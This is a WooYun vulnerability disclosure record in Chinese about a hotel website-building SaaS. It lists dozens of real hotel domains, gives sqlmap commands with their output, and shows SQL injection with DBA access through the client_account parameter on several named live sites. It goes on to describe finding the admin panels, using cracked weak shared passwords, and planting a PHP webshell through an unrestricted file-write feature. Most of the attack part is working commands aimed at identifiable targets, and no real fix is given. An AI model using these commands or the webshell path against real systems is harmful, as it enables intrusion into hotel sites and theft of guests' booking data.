{"id": 47580, "wybug_id": "wooyun-2014-080011", "wybug_title": "某通用酒店建站系统 SQL注入( 已getshell）可查订房信息", "wybug_corp": "广州市问途信息技术有限公司", "wybug_author": "小饼仔", "wybug_date": "2014-10-22 16:40", "wybug_open_date": "2015-01-20 16:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-22：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-01-20：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 该酒店建站系统用户包括单体酒店、集团酒店，集团酒店下面还有很多分店啊啊啊可以查到用户的客房预订信息，信息包括姓名、电话、邮箱...用户信息还可以导出、可以给用户推荐邮件等等通过cms系统中的一个功能来getshell，不容易，花了些功夫写的好辛苦，这个漏洞要是没 $ ,就再也不相信爱情了 详细说明：  1. 首先介绍下公司名称： 广州市问途信息技术有限公司网址：http://www.wintour.cn/介绍：中国酒店业最为专业的网络营销技术公司,运用互联网技术提升酒店收益,为酒店打造网络直销及客户服务平台以及酒店网络营销服务。包括酒店官方网站,多渠道预订引擎,客户会员营销管理系统,智能手机客户端和社会性媒体营销管理系统等。keywords：酒店网络营销,酒店网站,酒店网站建设,酒店在线直销,酒店移动互联网营销,智能手机客户端,收益管理系统,预订引擎,微博营销,酒店会员管理,酒店,酒店网站开发,移动营销常客计划2. 客户群官网有一些最新的客户案例，如图\n\n当然这只是一部分，根据官网的案例，得到关键字：技术伙伴:问途酒店网络营销顾问 html, 因为该公司之前好像有做过一套aspx的系统，新系统是php + mysql的，所以加上了个html，下面是搜索结果：\n\n结果不少，这里列举一些例子，证明其通用性：\n河南天地粤海酒店\thttp://www.skyland-hotel.com/博鳌和悦海景度假酒店\thttp://www.holliyardhotel.com/青岛CHINA公社\thttp://www.chinagongshe.com/河源市龙源温泉大酒店有限公司\thttp://www.lyhotspring.com/成都天府阳光\thttp://www.tfsunshinehotel.com/英德仙湖温泉度假区\thttp://www.singwood.com.cn/上海御庭集团\thttp://www.rhgresorts.com/首旅酒店集团\thttp://www.btghotels.com/首旅建国酒店管理有限公司\thttp://www.hotelsjianguo.com/成都钓鱼台精品酒店\thttp://www.dytchengdu.com/君廷国际酒店集团\thttp://www.baronyhotels.com/广东欧亚企业管理集团有限公司 \thttp://www.ouyahotels.com/湖南湘投阳光集团有限公司\thttp://www.hnsunshinegroup.com/厦门建发旅游集团股份有限公司 \thttp://cndhotels.com/粤海集团\thttp://www.gdhhotels.com/通程国际酒店管理有限责任公司\thttp://www.dolton-hotels.com/奥园养生酒店\thttp://www.aoyuanhealthhotel.com/凯荣都国际酒店\thttp://www.krdhotel.com/上海久阳滨江酒店\twww.eversunshinehotel.com/昆泰嘉华酒店\thttp://www.kuntairoyalhotel.com/广州远洋宾馆\thttp://www.oceanhotel.com.cn/广东东方国际饭店\thttp://www.mandarinhotelgd.com/get_password.html青海兴鼎安大酒店\thttp://www.xingdingan.com/get_password.html三亚柏瑞精品海景酒店\thttp://www.sanyabarry.com/get_password.html南沙奥园养生酒店\thttp://www.aoyuanhealthhotel.net/special_offer_3.html广州鸣泉居度假村\thttp://www.mqjgz.cn/get_password.html昆山新港湾大酒店\thttp://www.ksnewporthotel.com/get_password.html广东东方国际饭店\thttp://mandarin-hotel.com.cn/get_password.html北京应物会议中心\thttp://hy.yingwu.com.cn/get_password.html北大荒国际饭店\thttp://www.ebdh-hotel.com/get_password.html三亚中亚国际大酒店\thttp://www.joyahotel.com.cn/get_password.html常州九洲环宇\thttp://www.eco-hotel.com.cn/get_password.html广州逸林假日酒店\thttp://www.easelandhotel.com/get_password.html广东亚洲国际大酒店\thttp://www.aihotel.com/get_password.html桂林桂山华星酒店\thttp://www.guishanhotel.com/get_password.html嘉鸿华美达\thttp://www.ramadaplazagz.com/get_password.html深圳求水山酒店\thttp://www.qsshotel.com/get_password.html最佳西方武汉五月花大酒店\thttp://www.bwmayflowers.com.cn/get_password.html常州福记逸高酒店\thttp://www.happiness-hotel.com/苏州市冠云大酒店\thttp://www.glamorhotel.com/get_password.html三亚宝宏大酒店\thttp://www.baohonghotel.com/get_password.html五指山亚泰雨林度假酒店\thttp://www.wuzhishanyatai.com/get_password.html广州威尼國际酒店\thttp://www.vilihotel.com/get_password.html四会岭南东方酒店\thttp://www.lndfhotel-sh.com/get_password.html海南亚泰温泉酒店\thttp://www.hainanyataihotel.com/get_password.html佛山铂顿国际公寓\thttp://www.jbstel.com/get_password.html青城（豪生）国际酒店\thttp://www.87198677.com/get_password.html三亚湾玛格瑞特酒店\thttp://www.margaretresort.com/get_password.html江苏省南通市文峰饭店\thttp://www.wenfenghotel.com/get_password.html福州永泰香米拉温泉酒店\thttp://www.ytxml.com/get_password.html华北电力大厦\thttp://www.hbdlds.com/get_password.html北京四川五粮液龙爪树宾馆\thttp://www.lzshotel.com/get_password.html广东裕通大酒店有限公司\thttp://www.gdyutonghotel.com/get_password.html金燕国际温泉酒店\thttp://www.jinyanhotspring.com/login.html山东良友富临大酒店\thttp://www.sdlyfl.com/get_password.html红星剧院\thttp://www.xn--cerp49b31r6wv.com/member_forget.html\n   漏洞证明：  3. SQL注入首先是SQL注入，注入点其实很多，有找回密码处,url特征：\nhttp://网站地址/saas/Guest/getPassword/?jsoncallback=jQuery1910290548698278144_1413611376619&language=zh-cn&client_account=sy_brjp&code=&email=aa%40aa.com&_=1413611376622\n登入处，url特征：\nhttp://网站地址/saas/Guest/login/?jsoncallback=jQuery18305360387680120766_1413698031182&code=&account_id=aaa%40aa.com&password=123456&client_account=hn_tdhotel&language=zh-cn&_=1413698195122\n查询订单处等等，只要请求中包含了client_account这个参数，都存在注入。这里以找回密码为例子，这里选几个例子证明通用性，来源包括官网给出的最新案例，和通过搜索引擎找到的例子官网例子1.河南天地粤海酒店 http://www.skyland-hotel.com/到网站，点击登入，然后忘记密码，\n\n随便输入一个邮箱，然后burp抓包，请求链接：\nhttp://www.skyland-hotel.com/saas/Guest/getPassword/?jsoncallback=jQuery18305360387680120766_1413698031182&email=wooyun%40wooyun.com&client_account=hn_tdhotel&language=zh-cn&_=1413698837589\n丢到SQLMAP中跑，\npython sqlmap.py -u \"http://www.skyland-hotel.com/saas/Guest/getPassword/?jsoncallback=jQuery18305360387680120766_1413698031182&email=wooyun%40wooyun.com&client_account=hn_tdhotel&language=zh-cn&_=1413698837589\"  -p client_account --batch --is-dba  --current-db --current-user --threads 10  -D dossm --tablessqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: client_account    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: jsoncallback=jQuery18305360387680120766_1413698031182&email=wooyun@wooyun.com&client_account=hn_tdhotel' AND 7081=7081 AND 'jXPH'='jXPH&language=zh-cn&_=1413698837589    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: jsoncallback=jQuery18305360387680120766_1413698031182&email=wooyun@wooyun.com&client_account=hn_tdhotel' AND SLEEP(5) AND 'nnxL'='nnxL&language=zh-cn&_=1413698837589---back-end DBMS: MySQL 5.0.11current user:    'dOsSM2012@%'current database:    'dossm'current user is DBA:    True[14:15:32] [INFO] fetching database names[14:15:32] [INFO] fetching number of databases[14:15:32] [INFO] resumed: 360[14:15:32] [INFO] retrieving the length of query output[14:15:32] [INFO] resumed: 18[14:15:32] [INFO] resumed: information_schema[14:15:32] [INFO] retrieving the length of query output[14:15:32] [INFO] resumed: 14[14:15:32] [INFO] resumed: base_pay_tmpl1[14:15:32] [INFO] retrieving the length of query output[14:15:32] [INFO] resumed: 15[14:15:32] [INFO] resumed: base_pay_tmpl15360个数据库，篇幅原因不列了[14:37:24] [INFO] fetching tables for database: 'dossm'[14:37:24] [INFO] fetching number of tables for database 'dossm'[14:37:24] [INFO] retrieved: 63[14:37:26] [INFO] retrieving the length of query output[14:37:26] [INFO] retrieved: 15[14:37:38] [INFO] retrieved: tbl_barcode_log[14:37:38] [INFO] retrieving the length of query output[14:37:38] [INFO] retrieved: 11数据库dossm， 有63个表，不全列了\n官网例子2.君廷酒店及度假村集团 http://www.baronyhotels.com/member.html\n\n\nhttp://www.baronyhotels.com/saas/Guest/getPassword/?jsoncallback=jQuery183091423977073282_1413701179987&language=zh-cn&client_account=bc_group&email=aaa%40aa.com&_=1413701192852\n\npython sqlmap.py -u \"http://www.baronyhotels.com/saas/Guest/getPassword/?jsoncallback=jQuery183091423977073282_1413701179987&language=zh-cn&client_account=bc_group&email=aaa%40aa.com&_=1413701192852\" --is-dba --current-db  --current-user --threads 10 --batch --dbs -p client_account   sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: client_account    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: jsoncallback=jQuery183091423977073282_1413701179987&language=zh-cn&client_account=bc_group' AND 9376=9376 AND 'RPyV'='RPyV&email=aaa@aa.com&_=1413701192852---back-end DBMS: MySQL 5current user:    'dOsSM2012@%'current database:    'dossm'current user is DBA:    True[14:57:06] [INFO] fetching database names[14:57:06] [INFO] fetching number of databases[14:57:06] [INFO] resumed: 360[14:57:06] [INFO] retrieving the length of query output[14:57:06] [INFO] resumed: 18[14:57:06] [INFO] resumed: information_schema[14:57:06] [INFO] retrieving the length of query output[14:57:06] [INFO] resumed: 14[14:57:06] [INFO] resumed: base_pay_tmpl1[14:57:06] [INFO] retrieving the length of query output\n搜索引擎例子1： 海南亚泰温泉酒店 http://www.hainanyataihotel.com/get_password.html验证码，只在前端验证，可绕过\n\n\nhttp://www.hainanyataihotel.com/saas/Guest/getPassword/?jsoncallback=jQuery19106708567193709314_1413701355601&language=zh-cn&client_account=hn_ytwq&code=&email=aaa%40aaa.com&_=1413701355604\n\npython sqlmap.py -u \"http://www.hainanyataihotel.com/saas/Guest/getPassword/?jsoncallback=jQuery19106708567193709314_1413701355601&language=zh-cn&client_account=hn_ytwq&code=&email=aaa%40aaa.com&_=1413701355604\"  -p client_account --batch --is-dba  --current-db --current-user --threads 10  --dbssqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: client_account    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: jsoncallback=jQuery19106708567193709314_1413701355601&language=zh-cn&client_account=hn_ytwq' AND 6097=6097 AND 'tiqT'='tiqT&code=&email=aaa@aaa.com&_=1413701355604---back-end DBMS: MySQL 5current user:    'dOsSM2012@%'current database:    'dossm'current user is DBA:    True[15:01:14] [INFO] fetching database names[15:01:14] [INFO] fetching number of databases[15:01:14] [INFO] retrieved: 360[15:01:17] [INFO] retrieving the length of query output[15:01:17] [INFO] retrieved: 18[15:01:35] [INFO] retrieved: information_schema[15:01:35] [INFO] retrieving the length of query output\n搜索引擎例子2: 福州永泰香米拉温泉酒店  http://www.ytxml.com/get_password.html验证码，只在前端验证，可绕过\n\n\nhttp://www.ytxml.com/saas/Guest/getPassword/?jsoncaback=jQuery19104607683657668531_1413701675188&language=zh-cn&client_account=fz_ytxml&cod&email=aaa%40aaa.com&_=1413701675191\n\npython sqlmap.py -u \"http://www.ytxml.com/saas/Guest/getPassword/?jsoncaback=jQuery19104607683657668531_1413701675188&language=zh-cn&client_account=fz_ytxml&cod&email=aaa%40aaa.com&_=1413701675191\" --is-dba --current-db  --current-user --threads 10 --batch --dbs -p client_accountsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: client_account    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: jsoncallback=jQuery19104607683657668531_1413701675188&language=zh-cn&clientccount=fz_ytxml' AND 7780=7780 AND 'PnpY'='PnpY&code=&email=aaa@aaa.com&_=1413701675191---back-end DBMS: MySQL 5current user:    'dOsSM2012@%'current database:    'dossm'current user is DBA:    True[15:12:13] [INFO] fetching database names[15:12:13] [INFO] fetching number of databases[15:12:13] [INFO] resumed: 360[15:12:13] [INFO] retrieving the length of query output[15:12:13] [INFO] resumed: 18[15:12:13] [INFO] resumed: information_schema[15:12:13] [INFO] retrieving the length of query output[15:12:13] [INFO] resumed: 14\n4. getshell找到SQL注入后，想了想，不拿到shell不是好漏洞。所以开始通过sqlmap去getshell，发现用户没有写权限。所以就去找找后台，google发现后台链接，是官网地址的www换成cms，大部分例子都可以按照这个规则找到后台登入地址。例子有http://www.skyland-hotel.com/\thttp://cms.skyland-hotel.com/Login/loginhttp://www.holliyardhotel.com/\thttp://cms.holliyardhotel.com/Login/loginhttp://www.tfsunshinehotel.com/\thttp://cms.tfsunshinehotel.com/Login/loginhttp://www.singwood.com.cn/\thttp://cms.singwood.com.cn/Login/loginhttp://www.rhgresorts.com/\thttp://cms.rhgresorts.com/Login/loginhttp://www.btghotels.com/\thttp://cms.btghotels.com/Login/loginhttp://www.hotelsjianguo.com/\thttp://cms.hotelsjianguo.com/Login/loginhttp://www.ouyahotels.com/\thttp://cms.ouyahotels.com/Login/loginhttp://www.hnsunshinegroup.com/\thttp://cms.hnsunshinegroup.com/Login/loginhttp://cndhotels.com/\thttp://cms.cndhotels.com/Login/loginhttp://www.gdhhotels.com/\thttp://cms.gdhhotels.com/Login/loginhttp://www.dolton-hotels.com/\thttp://cms.dolton-hotels.com/Login/loginhttp://www.aoyuanhealthhotel.com/\thttp://cms.aoyuanhealthhotel.com/http://www.krdhotel.com/\thttp://cms.krdhotel.com/www.eversunshinehotel.com/\thttp://cms.eversunshinehotel.com/Login/loginhttp://www.kuntairoyalhotel.com/\thttp://cms.kuntairoyalhotel.com/Login/login等等界面类似：\n\n\n\n那么问题来了，学挖掘机技术哪家强（账号密码是什么）？经过寻找，发现数据库dossm中的表tbl_user保存的是账号密码，密码加密了，破解后找到几个弱密码的通用账号，\n\nmask 区域\n*****ng gr**********reen**********ng 12**********n 123********** 12*****\n\n随便找几个网站后台登入\n\n\n\n\n\n然后我们简单看下系统的功能：\n\n\n\n\n\n\n\n登入系统后，找找有什么地方可以上传shell，找了一圈，发现都是上传图片，后台也做了限制。不甘心，再找了找，发现有一个地方有点希望，可以上传.php后缀文件，还可以写文件，之后会介绍。<poc>我们先来看一下getshell的几个条件，1. 需要找到外界可以访问的url路径2. 可以找到url路径对应的绝对路径，并且该路径可写这里随便找一个系统为例，其他同理，首先我们来找条件1，cms系统中找到任意一个可以上传图片的位置\n\n点击图片，发现可以直接从外部访问\n\n那么再找到该url对应的绝对路径，点击浏览选择\n\n出现\n\nburp请求\n\n响应暴露绝对路径\n\n\nhttp://www.mqjgz.cn/public/images/53264b86d4322.700x400.jpg对应/home/wintour_web/pay_client.root/gz_mjdjc/public/images/53264b86d4322.700x400.jpg那么，我们只要将shell写入/home/wintour_web/pay_client.root/gz_mjdjc/public/images/heiha.php就可以通过http://www.mqjgz.cn/public/images/heiha.php 访问\n因为这里不能直接上传php后缀的文件，那么需要通过其他方式，经过寻找发现，有一处位置可以写文件，且对文件后缀没有做限制，如图（此处，其他系统可以构造url: htpp://cms网址/Website/languageFile,进入即可，如http://cms.mqjgz.cn/Website/languageFile，http://cms.cndhotels.com/Website/languageFile，http://cms.baohonghotel.com/Website/languageFile）\n\n我们来看一下burp请求，\n\n\n\n\n\n那么我们的shell地址就是，http://www.mqjgz.cn/public/upload/20141018/heiha.php用菜刀连接之，密码xxx</poc>\n\n再看几个其他shell \n\n\n\n   修复方案：  你懂得~   版权声明：转载请注明来源 小饼仔@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-10-22 16:47 |    \t\t小饼仔 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:48        | 不告诉你)\t\t \n  @疯狗为什么我这个走的是小厂商我的和 wooyun-2014-080156 是同一个系统，为什么我不能上首页！    \n     2014-10-27 14:21 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @小饼仔 呃，就是打漏洞啊（首显的）。    \n     2014-10-27 14:28 |    \t\t小饼仔 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:48        | 不告诉你)\t\t \n  @疯狗 狗哥终于回复了，原来走的是小厂商啊，没上首页，我发邮件到help@wooyun.org，然后回复说审核有点问题，说帮我改过来了，但是还是没上首页，还有个疑问，为什么我的洞不是直接给cncert，而是联系厂商啊，WooYun-2014-80156同一系统都是直接给cncert了    \n     2014-10-27 14:33 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @小饼仔 审核尽量都是通报企业直接对漏洞进行修复的，一些敏感政企类的会走cert通报    \n     2014-10-27 14:44 |    \t\t小饼仔 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:48        | 不告诉你)\t\t \n  @疯狗 好，多谢回复    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}